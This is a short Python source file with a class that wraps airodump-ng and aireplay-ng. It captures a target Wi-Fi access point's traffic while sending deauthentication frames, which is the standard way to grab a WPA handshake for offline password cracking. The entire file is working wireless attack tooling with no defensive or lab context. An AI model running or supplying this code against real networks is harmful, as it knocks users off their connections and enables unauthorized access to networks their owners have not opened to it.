import subprocess

class HandshakeCapture:
    @staticmethod
    def start_capture(interface, bssid, channel, output_file):
        cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "--write", output_file, interface]
        return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    @staticmethod
    def send_deauth(interface, bssid, count=15):
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
        return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
